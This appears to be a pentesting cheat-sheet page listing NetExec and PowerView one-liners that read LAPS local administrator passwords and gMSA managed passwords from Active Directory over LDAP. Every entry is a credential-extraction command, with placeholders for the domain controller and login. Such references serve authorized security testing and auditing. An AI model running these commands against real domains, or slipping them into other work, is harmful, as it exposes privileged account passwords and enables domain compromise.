# LAPS and gMSA

One-liners for managed local passwords and group-managed service accounts.

<div class="ol-section-kicker"><span>AD</span></div>

## NetExec LAPS

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --module laps
```

**Tool:** NetExec · **Platform:** Linux/macOS


## PowerView LAPS attributes

```powershell
Get-DomainComputer -Properties dnshostname,ms-Mcs-AdmPwd,msLAPS-Password
```

**Tool:** PowerView · **Platform:** Windows


## NetExec gMSA

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --gmsa
```

**Tool:** NetExec · **Platform:** Linux/macOS


## PowerView gMSA accounts

```powershell
Get-DomainUser -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' -Properties samaccountname,msDS-ManagedPassword
```

**Tool:** PowerView · **Platform:** Windows
